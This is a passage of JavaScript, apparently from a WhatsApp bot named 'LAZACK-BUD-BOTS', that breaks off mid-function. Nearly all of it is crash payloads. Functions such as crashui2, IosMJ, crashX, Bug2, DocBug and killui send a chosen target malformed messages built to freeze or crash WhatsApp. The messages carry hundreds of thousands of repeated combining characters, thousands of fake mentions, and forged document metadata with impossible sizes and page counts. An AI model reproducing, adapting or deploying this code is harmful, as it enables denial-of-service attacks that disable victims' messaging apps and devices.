̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴".repeat(50),
								},
								nativeFlowMessage: {
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["255734980103@s.whatsapp.net", ...Array.from({
										length: 10000
									}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "\u0000",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				{
					participant: {
						jid: target
					}
				}
			);
		};
	async function crashui2(target, ptcp = false) {
    await Lazack28.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "🔐 LAZACK-BUD-BOTS" + "ꦾ".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function IosMJ(target, Ptcp = false) {
      await Lazack28.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "🔐 LAZACK-BUD-BOTS" + "".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "Ueheheheeh",
                body: "Kmu Ga Masalah Kan?" + "".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://home.lazackorganisation.my.id",
                mediaUrl: "https://home.lazackorganisation.my.id",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://home.lazackorganisation.my.id",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "120363321705798318@newsletter",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363321705798318@newsletter",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbcayCampaignId: "smb_cay_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }

async function crashX(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
 "documentMessage": {
 "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
 "mimetype": "penis",
 "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
 "fileLength": "999999999",
 "pageCount": 999999999,
 "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
 "fileName": `🔐 LAZACK-BUD-BOTS.xp`+"ྦྷ".repeat(60000),
 "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
 "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
 "mediaKeyTimestamp": "1715880173"
 }
}), { userJid: target, quoted: kuwoted });
await Lazack28.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function crashbeta(target, ptcp = false) {
let BetaFc = "🔐 LAZACK-BUD-BOTS" + "ꦾ".repeat(250000);

const messageContent = {
    ephemeralMessage: {
        message: {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 0,
                        caption: BetaFc,
                        sequenceNumber: "",
                        jpegThumbnail: null
                    },
                    body: {
                        text: BetaFc
                    },
                    nativeFlowMessage: {}, // If needed, specify more details here
                    contextInfo: {
                     contactVcard: true,
                        mentionedJid: [m.chat],
                        groupMentions: [
                            { 
                                groupJid: "@@g.us", 
                                groupSubject: "lazack groups" 
                            }
                        ]
                    }
                }
            }
        }
    }
}
}

async function Bug2(target, ptcp = false) {
    let akumw = "🔐 LAZACK-BUD-BOTS" + "ꦿꦾ꧀".repeat(50000);
    await Lazack28.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: " TrashDex Explanation ",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: akumw
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function DocBug(target) {
 let virtex = "🔐 LAZACK-BUD-BOTS";
   Lazack28.relayMessage(target, {
     groupMentionedMessage: {
       message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "99999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "🔐 LAZACK-BUD-BOTS" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "LAZACK28" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
async function LocaBugs(target) {
 await Lazack28.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `🔐 LAZACK-BUD-BOTS`+'ꦾ'.repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "🔐 LAZACK-BUD-BOTS" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function killui(target, Ptcp = true) {
      await Lazack28.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "⿻",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
